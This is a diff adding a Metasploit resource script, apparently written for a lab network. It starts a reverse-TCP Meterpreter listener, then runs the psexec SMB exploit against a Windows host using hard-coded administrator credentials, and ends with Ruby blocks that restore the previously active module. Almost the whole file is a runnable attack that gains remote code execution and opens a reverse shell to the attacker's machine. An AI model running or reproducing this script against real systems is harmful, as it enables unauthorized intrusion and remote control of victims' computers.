@@ -1,0 +1,23 @@
+<ruby>
+	$rc_the_current_mod = active_module.fullname
+</ruby>
+
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.170.1
+set LPORT 8888
+set ExitOnSession false
+exploit -j -z
+use windows/smb/psexec
+set RHOST 192.168.170.131
+set SMBPass lab
+set SMBUser administrator
+set LPORT 8888
+set DisablePayloadHandler true
+exploit
+
+<ruby>
+	print_good "Restoring original active module (#{$rc_the_current_mod})"
+	run_single("use #{$rc_the_current_mod}")
+</ruby>
+
